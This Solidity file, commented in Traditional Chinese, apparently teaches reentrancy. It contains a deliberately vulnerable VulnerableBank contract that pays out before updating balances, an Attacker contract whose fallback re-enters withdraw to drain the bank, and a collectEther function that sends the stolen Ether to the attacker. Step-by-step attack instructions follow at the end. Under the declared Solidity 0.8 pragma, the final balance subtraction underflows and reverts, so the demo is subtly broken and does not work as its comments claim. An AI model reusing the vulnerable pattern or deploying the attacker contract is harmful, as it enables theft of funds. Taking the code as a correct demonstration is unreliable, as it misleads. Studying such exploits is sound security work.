pragma solidity >=0.8.0;

// VulnerableBank合約存在Incorrect Sequencing of Behavior的漏洞，
// 具體表現在withdraw函式中：先呼叫外部合約發送Ether，然後才更新內部狀態(balance)。
// 這使得攻擊者可以在外部呼叫期間重新進入withdraw從而重複提領資金。

contract VulnerableBank {
    // 狀態變數：使用mapping來追蹤每個地址的餘額
    mapping(address => uint) public balances;

    // 使用者可透過此函式存款
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    // withdraw函式存在漏洞：外部呼叫在狀態更新之前
    function withdraw(uint amount) external {
        require(balances[msg.sender] >= amount, "Insufficient funds"); // 驗證餘額是否足夠
        // 漏洞重點 : 先呼叫外部地址(攻擊者合約)再更新狀態
        (bool success, ) = msg.sender.call{value: amount}(""); 
        require(success, "Transfer failed");
        // 狀態變數更新在外部呼叫之後，造成不正確的行為順序
        balances[msg.sender] -= amount;
    }

    // 定義fallback和receive函式以接收Ether
    fallback() external payable {}
    receive() external payable {}
}

// 攻擊者合約：利用上面漏洞進行reentrancy攻擊
contract Attacker {
    VulnerableBank public vulnerable;
    address public owner;
    uint public attackAmount = 1 ether;

    // 建構子中設定被攻擊的VulnerableBank合約
    constructor(VulnerableBank _vulnerable) {
        vulnerable = _vulnerable;
        owner = msg.sender;
    }

    // 預先存入攻擊金額到VulnerableBank
    function deposit() external payable {
        require(msg.value == attackAmount, "Need exact attack amount");
        vulnerable.deposit{value: msg.value}();
    }

    // 攻擊入口點，觸發提款函式
    function attack() external {
        vulnerable.withdraw(attackAmount);
    }

    // fallback函式，在VulnerableBank呼叫msg.sender.call時被觸發
    fallback() external payable {
        // 當VulnerableBank還有足夠的Ether時，重入withdraw
        uint bankBalance = address(vulnerable).balance;
        if(bankBalance >= attackAmount) {
            vulnerable.withdraw(attackAmount);
        }
    }

    // 將攻擊中竊取到的Ether轉移給攻擊者
    function collectEther() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}

/*
部署與攻擊流程說明 (繁體中文)：
1. 攻擊者部署Attacker合約，並將VulnerableBank合約地址傳入建構子。
2. 攻擊者呼叫Attacker.deposit()向VulnerableBank存入1 ether。
3. 接著攻擊者呼叫Attacker.attack()觸發withdraw漏洞。
4. 在withdraw執行時，先以call方式發送Ether給攻擊者，觸發Attacker的fallback()
   並利用狀態未及時更新進行重入攻擊，多次提領資金。
*/
